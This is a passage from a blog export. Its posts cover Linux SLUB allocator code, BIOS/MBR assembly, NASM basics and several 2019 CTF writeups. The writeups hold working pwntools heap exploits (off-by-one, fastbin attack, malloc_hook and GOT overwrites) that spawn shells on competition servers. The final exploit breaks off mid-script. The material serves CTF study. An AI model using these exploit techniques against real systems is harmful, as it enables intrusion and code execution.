//活动slab尚有空闲对象,将slab的空闲对象队列指针复制到kmem_cache_cpu结构的freelist字段后设置为空,从此以后只从kmem_cache_cpu结构的freelist字段获得空闲对象队列信息. c-&gt;freelist = object[c-&gt;offset]; c-&gt;page-&gt;inuse = s-&gt;objects; c-&gt;page-&gt;freelist = NULL; c-&gt;node = page_to_nid(c-&gt;page);unlock_out: slab_unlock(c-&gt;page); stat(c, ALLOC_SLOWPATH); return object;another_slab: //取消当前活动slab,将其加入到所在NUMA节点的Partial队列中 deactivate_slab(s, c);new_slab: //优先从指定NUMA节点上获得一个Partial new = get_partial(s, gfpflags, node); if (new) &#123; c-&gt;page = new; stat(c, ALLOC_FROM_PARTIAL); goto load_freelist; &#125; if (gfpflags &amp; __GFP_WAIT) //开启中断,故后续创建slab操作可以睡眠 local_irq_enable(); //创建一个slab,并初始化所有对象 new = new_slab(s, gfpflags, node); if (gfpflags &amp; __GFP_WAIT) local_irq_disable(); if (new) &#123; c = get_cpu_slab(s, smp_processor_id()); stat(c, ALLOC_SLAB); if (c-&gt;page) flush_slab(s, c); slab_lock(new); SetSlabFrozen(new); c-&gt;page = new; goto load_freelist; &#125; if (!(gfpflags &amp; __GFP_NORETRY) &amp;&amp; (s-&gt;flags &amp; __PAGE_ALLOC_FALLBACK)) &#123; if (gfpflags &amp; __GFP_WAIT) local_irq_enable(); //如果内存不足,无法创建slab,调用kmalloc_large(实际调用物理页框分配器)分配对象. object = kmalloc_large(s-&gt;objsize, gfpflags); if (gfpflags &amp; __GFP_WAIT) local_irq_disable(); return object; &#125; return NULL;debug: if (!alloc_debug_processing(s, c-&gt;page, object, addr)) goto another_slab; c-&gt;page-&gt;inuse++; c-&gt;page-&gt;freelist = object[c-&gt;offset]; c-&gt;node = -1; goto unlock_out;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364////mm/slub.cstatic __always_inline void slab_free(struct kmem_cache *s, struct page *page, void *x, void *addr) &#123; void * * object = (void *)x; struct kmem_cache_cpu * c; unsigned long flags; local_irq_save(flags); c = get_cpu_slab(s, smp_processor_id()); debug_check_no_locks_freed(object, c-&gt;objsize); if (likely(page == c-&gt;page &amp;&amp; c-&gt;node &gt;= 0)) &#123; //如果对象属于处理器当前活动的slab,或处理器所在NUMA节点号不为-1(调试使用的值),将对象放回空闲对象队列 object[c-&gt;offset] = c-&gt;freelist; c-&gt;freelist = object; stat(c, FREE_FASTPATH); &#125; else //否则调用__slab_free函数 __slab_free(s, page, x, addr, c-&gt;offset); local_irq_restore(flags);&#125;static void __slab_free(struct kmem_cache *s, struct page *page, void *x, void *addr, unsigned int offset) &#123; //执行本函数表明对象所属slab并不是某个活动slab void * prior; void * * object = (void *)x; struct kmem_cache_cpu * c; c = get_cpu_slab(s, raw_smp_processor_id()); stat(c, FREE_SLOWPATH); slab_lock(page); if (unlikely(SlabDebug(page))) goto debug;checks_ok: //保存空闲对象队列的指针,将对象放回此队列,最后把已分配对象数目减一 prior = object[offset] = page-&gt;freelist; page-&gt;freelist = object; page-&gt;inuse--; if (unlikely(SlabFrozen(page))) &#123; stat(c, FREE_FROZEN); goto out_unlock; &#125; if (unlikely(!page-&gt;inuse)) //如果已分配对象数为0,说明slab处于Empty状态,转到slab_empty goto slab_empty; if (unlikely(!prior)) &#123; //如果原空闲对象队列的指针为空,说明slab原来的状态为Full,那么现在的状态应该是Partial,将该slab加到所在节点的Partial队列中. add_partial(get_node(s, page_to_nid(page)), page, 1); stat(c, FREE_ADD_PARTIAL); &#125;out_unlock: slab_unlock(page); return;slab_empty: if (prior) &#123; //如果slab状态转为Empty,且先前位于节点的Partial队列中,则将其剔出并释放所占内存空间. remove_partial(s, page); stat(c, FREE_REMOVE_PARTIAL); &#125; slab_unlock(page); stat(c, FREE_SLAB); discard_slab(s, page); return;debug: if (!free_debug_processing(s, page, x, addr)) goto out_unlock; goto checks_ok;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>RTFSC</category>
      </categories>
      <tags>
        <tag>Linux-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-redhat-2019-quals]]></title>
    <url>%2Fposts%2F9c3e1ec4%2F</url>
    <content type="text"><![CDATA[pwn three 利用三字节指令mov eax, [ecx];ret控制返回值,从而爆破flag. 1234567891011121314151617181920212223from pwn import *context(os="linux", arch="i386")keys = "qwertyuiopasdfghjklzxcvbnm[]\&#123;\&#125;:\"?./_+1234567890-=!@#$%^&amp;*()`~"flag = ""for i in range(32): for char in keys: r = remote("47.104.190.38", "12001") r.sendlineafter("Give me a index:\n", str(i)) r.sendafter("I like it very much!\n", asm("mov eax, [ecx];ret")) r.sendlineafter("Leave you name of size:\n", "2") r.sendafter("Tell me:\n", char) answer = int(r.recvline()) r.close() if answer == 1: print "id" + str(i) + ": " + char flag += char breakprint flag rev xx code长度为19,字符集为qwertyuiopasdfghjklzxcvbnm1234567890. 中间是tea加密. 后面有一轮异或和交换,解密脚本. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051num = 0xFA5656E7C80218233502F79120209BEFC0953A7C6B40BCCEnum_list = []while num &gt; 0: num_list.append(num % 0x100) num = num / 0x100#print num_listfor i in range(24): z = 0 if (24 - i - 1) / 3 &gt; 0: while z &lt; (24 - i - 1) / 3: num_list[24 - i - 1] = num_list[24 - i - 1] ^ num_list[z] z = z + 1#print num_listnum_list2 = []num_list2.append(num_list[1])num_list2.append(num_list[3])num_list2.append(num_list[0])num_list2.append(num_list[2])num_list2.append(num_list[5])num_list2.append(num_list[7])num_list2.append(num_list[4])num_list2.append(num_list[6])num_list2.append(num_list[9])num_list2.append(num_list[11])num_list2.append(num_list[8])num_list2.append(num_list[10])num_list2.append(num_list[13])num_list2.append(num_list[15])num_list2.append(num_list[12])num_list2.append(num_list[14])num_list2.append(num_list[17])num_list2.append(num_list[19])num_list2.append(num_list[16])num_list2.append(num_list[18])num_list2.append(num_list[21])num_list2.append(num_list[23])num_list2.append(num_list[20])num_list2.append(num_list[22])num = 0for x in num_list2: num = num * 0x100 num = num + xprint hex(num) 由于密钥也被加密了,密钥为四位,爆破得出密钥是flag,解密获得flag. 12345678910#include"xxtea.h"#include&lt;stdio.h&gt;int main() &#123; char buffer[] = &#123;0xbc, 0xa5, 0xce, 0x40, 0xf4, 0xb2, 0xb2, 0xe7, 0xa9, 0x12, 0x9d, 0x12, 0xae, 0x10, 0xc8, 0x5b, 0x3d, 0xd7, 0x6, 0x1d, 0xdc, 0x70, 0xf8, 0xdc&#125;; char key[] = "flag"; size_t len; char * decrypt = (char*)xxtea_decrypt(buffer, 24, key, &amp;len); puts(decrypt);&#125; easyRE 第一步解密. 1234567nums = [0x49, 0x6F, 0x64, 0x6C, 0x3E, 0x51, 0x6E, 0x62, 0x28, 0x6F, 0x63, 0x79, 0x7F, 0x79, 0x2E, 0x69, 0x7F, 0x64, 0x60, 0x33, 0x77, 0x7D, 0x77, 0x65, 0x6B, 0x39, 0x7B, 0x69, 0x79, 0x3D, 0x7E, 0x79, 0x4C, 0x40, 0x45, 0x43]x = ""for i in range(36): x += chr(nums[i] ^ i)print x#Info:The first four chars are `flag` 后面是多次base64加密,解密得:https://bbs.pediy.com/thread-254172.htm. 动态调试发现fini里面调用了加密函数,已知明文前四位求出密钥,解密密文获得flag. 12345678910111213m = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B]d = "flag"key=[]flag = ""for i in range(len(d)): key += [m[i] ^ ord(d[i])]for i in range(len(m)): flag += chr(m[i] ^ key[i % 4])print flag childRE 先打乱,然后UnDecorate,然后一个置换的加密. 先从置换中爆破出UnDecorate后的内容： 1234567891011str1 = "(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;"str2 = "55565653255552225565565555243466334653663544426565555525555222"table = "1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;'ASDFGHJKL:\"ZXCVBNM&lt;&gt;?zxcvbnm,./"m = ""for i in range(62): for j in range(0x20, 0x7f): if (char_set[j % 23] == str1[i]) and (char_set[j // 23] == str2[i]): m += chr(j) print(m) 得到. 1private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *) 构造一个一模一样的类,PS:VS中不调用的方法会被优化. 1234567891011121314151617181920212223class R0Pxx&#123; public: void test() &#123; unsigned char * a1 = nullptr; My_Aut0_PWN(a1); &#125; private: char * My_Aut0_PWN(unsigned char * a1) &#123; return (char *)a1; &#125;&#125;;int main()&#123; R0Pxx demo; demo.test(); return 0;&#125; VS自带的dumpbin工具可以输出符号. 1dumpbin.exe /symbols C:\Users\w4rd3n\source\repos\Project2\x64\Debug\Project2.obj | grep My_Aut0_PWN 最后复原?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z获得flag. 123456789101112import hashliba = "?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z"idx = [30, 14, 29, 6, 13, 21, 28, 2, 5, 9, 12, 17, 20, 24, 27, 0, 1, 3, 4, 7, 8, 10, 11, 15, 16, 18, 19, 22, 23, 25, 26]res = ''for i in idx: res += a[i]res = a.encode()flag = hashlib.md5(res).hexdigest()print(flag) Snake 使用ILSpy逆向Assembly-CSharp.dll,发现游戏主体调用Interface.dll,使用IDA逆向.查找String发现关键函数GameObject.其参数(Unity中)是坐标,尝试爆破. 12345678910111213141516171819202122232425262728#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;libloaderapi.h&gt;int main()&#123; const char* funcName = "GameObject"; HMODULE hDLL = LoadLibrary(L"C:\\Users\\w4rd3n\\Desktop\\RedHat\\Snake\\Snake_Data\\Plugins\\Interface.dll"); if (hDLL != NULL) &#123; typedef int (*funcptr)(int); funcptr func = (funcptr)GetProcAddress(hDLL, funcName); if (func != NULL) &#123; for (int i = 0; i &lt; 100; i++) &#123; signed int res = func(i); printf("%d: %d\n", i, res); &#125; &#125; else &#123; printf("no func\n"); &#125; &#125; else &#123; printf("load fail\n"); &#125; getchar(); return 0;&#125; misc 恶臭的数据包 得到附件使用wireshark打开流量包,发现是一个无线流量包. 把数据包丢进kali使用aircrack-ng进行分析为WPA协议,破解密码:12345678. 导入密码到wireshark然后重新用wireshark打开流量包过滤剩下http协议的流量包发现三个上传图片的流量. 使用binwalk分解图片,得到一个压缩包和一个flag.txt,但是无解. 发现cookies部分有点像base64遂解密发现是JWT认证,解密后得到hint提示要找到ping过的一个网站. 重新查看wireshark拿到26rsfb.dnslog.cn. 成功解压压缩包得到flag{f14376d0-793e-4e20-9eab-af23f3dc158}.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hxb-2019-quals]]></title>
    <url>%2Fposts%2F1ececfa4%2F</url>
    <content type="text"><![CDATA[HackNote edit的时候用了strlen,off_by_one. 堆重叠后fastbin attack,通过劫持fd将size填充到main_arena,修改unsorted bin为malloc_hook,再次分配修改malloc_hook到shellcode. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *malloc_hook = 0x6CB788free_hook = 0x6CD5E8context.log_level = 'debug'context(os="linux", arch="amd64")def add(size, content): r.sendline("1") r.sendlineafter("Input the Size:\n", str(size)) r.sendafter("Input the Note:\n", content) r.recvuntil("4. Exit\n-----------------\n")def dele(index): r.sendline("2") r.sendlineafter("Input the Index of Note:\n", str(index)) r.recvuntil("4. Exit\n-----------------\n")def edit(index, content): r.sendline("3") r.sendlineafter("Input the Index of Note:\n", str(index)) r.sendafter("Input the Note:\n", content) r.recvuntil("4. Exit\n-----------------\n")#r = process("./HackNote")r = remote("183.129.189.62", "17104")r.recvuntil("4. Exit\n-----------------\n")add(0x108, "a\n")#0add(0x200, "a" * 0x1f0 + p64(0x200) + "\n")#1add(0x100, "a\n")#2add(0x100, "a\n")#3edit(0, "a" * 0x108)dele(1)edit(0, "a" * 0x108 + "\n")add(0xc0, "a\n")#1add(0x50, "a\n")#4add(0x60, "a\n")#5dele(1)dele(2)add(0x300, "a\n")#1dele(4)dele(5)edit(1, "a" * 0xc8 + p64(0x60) + p64(0x71) + p64(0) * 10 + p64(0x71) + p64(0x6cb820) + "\n")add(0x50, "a\n")#2add(0x60, "a\n")#4add(0x60, p64(0) * 5 + p64(0x6CB788 - 0x10) + "\n")#4add(0x60, p64(0x6cb790) + asm(shellcraft.sh()) + "\n")#4r.sendline("1")r.sendlineafter("Input the Size:\n", str(1))#gdb.attach(r)r.interactive() NameSystem 填满指针数组后可double free进行fastbin attack. 先修改一个堆指针为got表项,然后修改free@got为puts@plt,同时设计一个size准备下一次fastbin attack. 泄露地址,再次修改free@got为system,获得shell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *def add(size, content): r.sendline("1") r.sendlineafter("Name Size:", str(size)) r.sendlineafter("Name:", content) r.recvuntil("Your choice :\n")def dele(index): r.sendline("3") r.sendlineafter("The id you want to delete:", str(index)) r.recvuntil("Your choice :\n")#r = process("./NameSystem")r = remote("183.129.189.62", "15505")r.recvuntil("Your choice :\n")for i in range(18): add(0x40, "a")add(0x60, "a")add(0x60, "a")dele(0)dele(18)dele(17)dele(19)dele(0)add(0x50, "a")add(0x50, "a")dele(0)dele(18)dele(17)dele(19)dele(0)add(0x30, "a")add(0x30, "a")dele(0)dele(18)dele(17)dele(19)for i in range(13): dele(0)add(0x60, p64(0x60208d))add(0x60, p64(0))add(0x60, "/bin/sh\x00")add(0x60, "\x00" * 3 + p64(0x602060))add(0x50, p64(0x601ffa))add(0x50, p64(0))add(0x50, "/bin/sh\x00")add(0x50, "\x00" * 6 + p64(0x41) + p32(0x4006A0) + "\x00" * 3)r.sendline("3")r.sendlineafter("The id you want to delete:", str(0))libc = u64(r.recvuntil("\n").ljust(8, "\x00")) + 0x7fb44b795000 - 0xa7fb44b7cbe80add(0x30, p64(0x602008))add(0x30, p64(0))add(0x30, "/bin/sh\x00")add(0x30, p64(libc + 0x45390)[:7])r.sendline("3")r.sendlineafter("The id you want to delete:", str(15))#gdb.attach(r)print "libc: " + hex(libc)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-assembly-IA32-BIOS编程]]></title>
    <url>%2Fposts%2Fff138e1%2F</url>
    <content type="text"><![CDATA[概览 BIOS支持基本的键盘,鼠标等输入设备,也支持基本的显示输出和打印操作,还有读写外部存储设备. 键位与扫描码 键盘上的键可以分为五类:字符键(字母,数字,标点等),功能键(如F1,PgUp等),控制键(Ctrl,Alt和左右Shift),双态键(如Num Lock和Caps Lock等),特殊请求键(如Print Screen等).其中字符键有对应的ASCII码,其他的键没有.每个键都有一个代表键位置的扫描码.当按键操作发送,键盘会发送扫描码到主机. 键盘中断程序根据扫描码进行处理:对于字符键会把扫描码与ASCII码存到键盘缓冲区,对于功能键会把扫描码存到键盘缓冲区,对于控制键和双态键仅会记住状态,而对于特殊请求键会直接处理. 键盘I/O程序 BIOS中提供键盘输入功能的程序叫做键盘I/O程序,通过编号(置于AH寄存器)调用程序(INT 16H)不同的功能,调用返回后,从有关寄存器获取出口参数(返回值). 12345678MOV AH, 0INT 16H;读取键盘缓冲区,AL为ASCII码(功能键ASCII码为0),AH为扫描码.无字符时等待.MOV AH, 1INT 16H;ZF=1表示键盘缓冲区含有键码,ZF=0表示无.MOV AH, 2INT 16H;AL=变换键状态字节 变换键状态字节. 0位:为1表示按下右Shift. 1位:为1表示按下左Shift. 2位:为1表示按下控制键CTRL. 3位:为1表示按下替换键ALT. 4位:为1表示Scroll Lock状态已变换. 5位:为1表示Num Lock状态已变换. 6位:为1表示Caps Lock状态已变换. 7位:为1表示Insert状态已变换. 显示I/O程序 现在基本上都是使用图像显示方式,最经典的文本显示模式是25行80列(2000字符). BIOS中提供显示输出功能的程序叫做显示I/O程序,通过编号(置于AH寄存器)调用程序(INT 10H)不同的功能,入口参数和出口参数置于有关寄存器. 在屏幕上显示的字符代码及其属性被依次保存在显示缓冲区中.可以认为显示页号是现实缓冲区的编号,可通过五号功能选择当前页,默认使用第0页. 1234567891011121314151617181920212223242526272829303132333435MOV BH, 2;显示页号MOV DH, 2;行号MOV DL, 2;列号MOV AH, 2;INT 10H;置输出光标位置MOV BH, 2;显示页号MOV AH, 3;INT 10H;读光标位置,CH=光标开始行,CL=光标结束行,DH=行号,DL=列号.MOV AL, 2;新页号MOV AH, 5;INT 10H;选择当前显示页MOV BH, 2;显示页号MOV AH, 8;INT 10H;读取光标位置处的字符和属性MOV BH, 2;显示页号MOV AL, 2;字符代码MOV BL, 2;属性MOV CX, 2;字符重复次数MOV AH, 9;INT 10H;输出,但光标不移动MOV BH, 2;显示页号MOV AL, 2;字符代码MOV CX, 2;字符重复次数MOV AH, 10;INT 10H;输出,但光标不移动,不带属性MOV BH, 2;显示页号MOV AL, 2;字符代码MOV AH, 14;INT 10H;TTY方式显示,光标处显示字符并后移光标,解释回车,换行,退格和响铃等控制符. 磁盘读写 BIOS中提供磁盘读写功能的程序叫做磁盘I/O程序,通过编号(置于AH寄存器)调用程序(INT 13H)不同的功能,入口参数和出口参数置于有关寄存器. 早期PC有两个软盘驱动器A,B盘,所以硬盘从C开始编号. 12345678910111213141516171819MOV DL, 80H;驱动器号,80H表示C盘,81H代表D盘MOV AX, 0MOV ES, AXMOV BX, 7C00H;ES:BX=缓冲区起始地址MOV DH, 0;磁头号MOV CH, 0;柱面号MOV CL, 1;扇区号MOV AL, 1;读取的扇区个数MOV AH, 2;读取磁盘内容INT 13HJC Error;CF反映操作是否成功(0表示成功),不成功时AH为出错状态代码.;实际上柱面号为CH内容组成低8位,CL高2位组成高2位,共10位.扇区号为CL低6位组成.;写磁盘只需要修改调用号为3MOV DL, 80HMOV AH, 0;磁盘系统复位INT 13H;CF反映操作是否成功(0表示成功),不成功时AH为出错状态代码. 主引导记录 MBR是位于启动磁盘首个扇区(LBA编址逻辑块号为0,CHS编址0 0 1的扇区)的引导程序(512字节,由主引导程序446字节,磁盘分区表64字节,标记2字节(55,AA)组成). PC启动完成加电自检后,BIOS将按照预定的启动顺序读取MBR到0000:7C00H内存区域,并转到主引导程序执行. MBR通常负责将操作系统的引导程序装载到内存,并转到操作系统的引导程序,由操作系统完成自举. 主引导程序执行的主要步骤. 自身腾挪.由于操作系统的引导程序将占据0000:7C00H,所以MBR要先移动自己的代码. 识别活动分区.根据磁盘分区表找到要启动的操作系统所在的分区. 加载位于活动分区的操作系统的引导程序. 跳转到操作系统的引导程序. 自制简易MBR. 12345678nasm.exe loader.asm -f bin -o loader#编译成bindd if=loader of="C:\Users\w4rd3n\VirtualBox VMs\asm\asm.vhd" bs=512 count=1 conv=notrunc#写入到对应扇区nasm.exe program.asm -f bin -o programdd if=program of="C:\Users\w4rd3n\VirtualBox VMs\asm\asm.vhd" bs=512 seek=50 count=1 conv=notruncnasm.exe break.asm -f bin -o breakdd if=break of="C:\Users\w4rd3n\VirtualBox VMs\asm\asm.vhd" bs=512 seek=100 count=1 conv=notrunc 源代码. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181;loader.asmSig EQU 0 ;子程序头部签名Len EQU 4 ;子程序长度Entry EQU 6 ;子程序入口MyLow EQU 1000H ;子程序使用的内存区的段值的最小值MyHigh EQU 9000H ;子程序使用的内存区的段值的最大值MyBuffer EQU 07E0H ;用于读取首个扇区的缓冲区的段值,后面的扇区直接传送到目标扇区section textbits 16org 7C00HStart:MOV AX, 0 CLIMOV SS, AXMOV SP, 7C00HSTIL1:CLDPUSH CSPUSH DSMOV AX, CSMOV DS, AXMOV AX, MyBufferMOV ES, AXMOV DX, mess0CALL PutStrCALL GetCharCALL PutCharCMP AL, 30HJZ EndCMP AL, 32HJA Error4CMP AL, 31HJNZ L8MOV AL, 50JMP L9L8:MOV AL, 100L9:MOV [DiskAP + 8], ALCALL ReadSecJC Error1CMP DWORD [ES:Sig], "Iadc"JNZ Error2MOV CX, [ES:Len]CMP CX, 0JZ Error3ADD CX, 511SHR CX, 9MOV AX, [ES:Entry + 2]CMP AX, MyLowJB L2CMP AX, MyHighJB L3L2:MOV AX, MyLowL3:MOV WORD [DiskAP + 6], AXMOV ES, AXXOR DI, DIPUSH DSPUSH MyBufferPOP DSXOR SI, SIPUSH CXMOV CX, 128REP MOVSDPOP CXPOP DSDEC CXJZ L5L4:ADD WORD [DiskAP + 6], 20HINC DWORD [DiskAP + 8]CALL ReadSecJC Error1LOOP L4L5:MOV [ES:Entry + 2], ESCALL FAR [ES:Entry]JMP L1Error1:MOV DX, Error1_mesCALL PutStrJMP L1Error2:MOV DX, Error2_mesCALL PutStrJMP L1Error3:MOV DX, Error3_mesCALL PutStrJMP L1Error4:MOV DX, Error4_mesCALL PutStrJMP L1End:MOV DX, End_mesCALL PutStrHalt:HLTJMP SHORT HaltReadSec:PUSH DXPUSH SIMOV SI, DiskAPMOV DL, 80HMOV AH, 42HINT 13HPOP SIPOP DXRETGetChar:MOV AH, 0INT 16HRETPutChar:MOV BH, 0MOV AH, 14INT 10HRETPutStr:MOV BH, 0MOV SI, DXL6:LODSBOR AL, ALJZ L7CALL PutCharJMP L6L7:RET;---------------------------;磁盘地址包DiskAP:DB 10H ;DAP尺寸DB 0 ;保留DW 1 ;扇区数DW 0 ;缓冲区偏移DW MyBuffer ;缓冲区段值DD 0 ;起始扇区号LBA的低4字节DD 0 ;起始扇区号LBA的高4字节mess0 db "0. Halt", 0DH, 0AH, "1. program", 0DH, 0AH, "Input your choice:", 0Error1_mes db 0DH, 0AH, "Invaild sector", 0DH, 0AH, 0Error2_mes db 0DH, 0AH, "Error Sig", 0DH, 0AH, 0Error3_mes db 0DH, 0AH, "Error Len", 0DH, 0AH, 0Error4_mes db 0DH, 0AH, "Error Choice", 0DH, 0AH, 0End_mes db 0DH, 0AH, "Halt...", 0times 510 - ($ - $$) db 0db 55h, 0aah 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121;break.asmSig db "Iadc"Len dw End_textEntry dw StartMySeg dw 6660HPad dd 0Start:MOV AX, 0MOV DS, AXCLIMOV AX, [9 * 4]PUSH AXMOV AX, [9 * 4 + 2]PUSH AXMOV WORD [9 * 4], my_int09h_handleMOV [9 * 4 + 2], CSSTIMOV AX, CSMOV DS, AXTest:MOV AH, 0INT 16HCMP AL, 0DHJZ LLCLDMOV DX, mess0CALL PutStrJMP TestLL:MOV AX, 0MOV DS, AXCLIPOP AXMOV [9 * 4 + 2], AXPOP AXMOV [9 * 4 + 2], AXSTIRETFmy_int09h_handle:PUSHAMOV AL, 0ADHOUT 0x64, ALIN AL, 0x60STICALL my_int09h_funCLIMOV AL, 0AEHOUT 0x64, ALMOV AL, 20HOUT 20H, ALPOPAIRETmy_int09h_fun:CMP AL, 1CHJNZ L1MOV AH, ALMOV AL, 0DHCALL SaveJMP ExitL1:MOV AH, ALMOV AL, 30HCALL SaveExit:RETSave:PUSH DSMOV BX, 40HMOV DS, BXMOV BX, [001CH]MOV SI, BXADD SI, 2CMP SI, 003EHJB L2MOV SI, 001EHL2:CMP SI, [001AH]JZ L3MOV [BX], AXMOV [001CH], SIL3:POP DSRETPutChar:MOV BH, 0MOV AH, 14INT 10HRETPutStr:MOV BH, 0MOV SI, DXL6:LODSBOR AL, ALJZ L7CALL PutCharJMP L6L7:RETmess0 db 0DH, 0AH, "I am New int 09", 0DH, 0AH, 0End_text: 1234567891011121314151617181920212223242526272829303132333435363738;program.asmSig db "Iadc"Len dw End_textEntry dw StartMySeg dw 2330HPad dd 0Start:MOV AX, CSMOV DS, AXCLDMOV DX, mess0CALL PutStrRETFPutChar:MOV BH, 0MOV AH, 14INT 10HRETPutStr:MOV BH, 0MOV SI, DXL6:LODSBOR AL, ALJZ L7CALL PutCharJMP L6L7:RETmess0 db 0DH, 0AH, "Hello World", 0DH, 0AH, 0End_text:]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-assembly-IA32-实地址方式]]></title>
    <url>%2Fposts%2Fd2c96227%2F</url>
    <content type="text"><![CDATA[环境 推荐使用NASM加32位Windows 7. 实地址方式 实地址方式可以访问8个32位通用寄存器,但EIP,ESP,EFLAGS都只有低16位起作用.实地址方式下处理器的基本执行环境和基本指令集与保护方式是相同的.不过间接寻址中不能使用比例因子. NASM编程 NASM大小写敏感. 12345NASM 1.asm -o 1.com#COM程序会从段内偏移100H开始执行,因为COM为纯二进制文件NASM 1.asm -f obj -o 1.objLINK 1.obj;#生成exe程序,从标号..start开始执行 示例. 12345678910111213segment code..start:MOV AH, 1INT 21H;调用系统例程读取键盘输入到ALMOV DL, ALMOV AH, 2INT 21H;调用系统例程输出DLsegment stack stack;显式定义堆栈段,后一个stack为段类型resb 1024;定义1024字节作为堆栈stacktop:;栈底 汇编语句 汇编语言有四种语句:指令语句,伪指令语句,宏指令语句,指示语句. 指令:机器指令的符号化,也就是用助记符来编写机器指令,如MOV. 1[标识符:] [指令助记符] [操作数表] [;注释] 伪指令:汇编器定义的指令,用于定义变量,预留存储单元,如$a db 'H', '$'. 伪指令定义符有DB(字节),DW,DD,DQ(64位),参数表通过,分隔. 1[标识符] [伪指令定义符] [参数表] [;注释] 指示:汇编器定义的指令,用于指示汇编器如何生成目标代码,如segment a. 汇编标识符由字母,数字及一些特定字符(-,$,#,@,~,.,?,_)等组成,只有字母,.,_,?可以作为标识符开头. NASM支持未初始化变量,对应伪指令定义符为RESB,RESW,RESD.如buf resb 100,buf指向的内存空间就预留了100字节. NASM提供常数符号化伪指令.如a EQU 100. NASM支持重复汇编前缀TIMES.如TIMES 6 MOVSB,这里会生成六条MOVSB指令. NASM支持两个特殊的符号,$和$$,$的值未当前指令的偏移,$$为当前段在整个程序的偏移. NASM支持四种常数:整数,字符,字符串和浮点数. 整数:无后缀表示十进制,后缀H/h表示十六进制,后缀D/d表示十进制,后缀Q/q和O/o表示八进制,后缀B/b表示二进制.前缀0x也表示十六进制. 字符:字符常数可以是使用单引号或双引号包围的若干字符,最多四个(32位数据),前面的字符占用低地址. 字符串:与字符类似,当可以包含更多字符. NASM同时支持表达式中使用运算符,如:|,^,&amp;,&gt;&gt;,&lt;&lt;,+,-,*,/(无符号除),//(有符号除),%(无符号模),%%(有符号模),!,~,seg(获取段值). 段声明语句:section/segment code [type] [;comment]. 段间跳转:JMP code:seg1.由于实方式下指令地址实际为CS:IP,所以段间跳转需要指明段名,或者使用FAR类型符,JMP FAR seg1. 对应的过程调用与返回指令格式:CALL code:seg1(CALL FAR seg1),RETF(调用时会将段值和偏移都压栈),RETF count(RETF同时使SP加count). 段模式声明语句:BITS 32,BITS 16.用于切换NASM当前汇编的段模式. 宏指令:与高级语言的宏意义相同.在宏中可以使用%%前缀声明局部标号. 12345678910111213141516171819202122232425%macro getChar 0 MOV AH, 1 INT 21H%endmacro%define move MOV%idefine i 200;大小写不敏感%macro dbmess 2 mess%1 db %2, 0DH, 0AH, '$'%endmacro;使用参数拼接获得新的符号%macro d2mess 2 mess%&#123;1&#125;1 db %2, '$'%endmacro%macro CMOV 3 J%-1 %%SKIP MOV %2, %3%%SKIP%endmacro;%+1表示参数为条件码,%-1表示参数为条件码,且拼接使用相反的条件码.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-dhbctf-2019-quals]]></title>
    <url>%2Fposts%2F1d8fb5d%2F</url>
    <content type="text"><![CDATA[boring_heap abs函数经典漏洞,update修改size和presize制造unsortedbin泄露堆地址. 然后就可以利用堆重叠进行fastbin attack将fake_size填入fastbin,然后malloc到main_arena中,修改top_chunk从而malloc到malloc_hook. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *context.log_level = 'debug'def add(choice, content): r.sendline("1") r.sendlineafter("Large\n", str(choice)) r.sendafter("Content:\n", content) r.recvuntil("5.Exit")def update(index, offset, content): r.sendline("2") r.sendlineafter("update?\n", str(index)) r.sendlineafter("update?\n", str(offset)) r.sendafter("Content:\n", content) r.recvuntil("5.Exit")def dele(index): r.sendline("3") r.sendlineafter("delete?\n", str(index)) r.recvuntil("5.Exit")def view(index): r.sendline("4") r.sendlineafter("view?\n", str(index)) data = r.recvline() data += r.recvline()[:-1] r.recvuntil("5.Exit") return datar = process('./pwn')#r = remote("8sdafgh.gamectf.com", "10001")add(3, "/bin/sh\n")#0add(2, "a\n")#1add(3, "a\n")#2add(2, "a\n")#3add(2, "a\n")#4add(2, "a\n")#5update(1, 0x80000000, p64(0) * 3 + p64(0x91 + 0x40) + "\n")dele(1)add(2, "\n")#6libc = u64(view(6)[:6].ljust(8,'\x00')) + 0x7fa5f5663000 - 0x7fa5f5a27c0aadd(3, "a\n")#7add(2, "a\n")#8dele(3)update(8, 0, p64(0x51) + "\n")add(2, "a\n")#9dele(2)update(7, 0, p64(libc + 0x3c4b10 + 0x20) 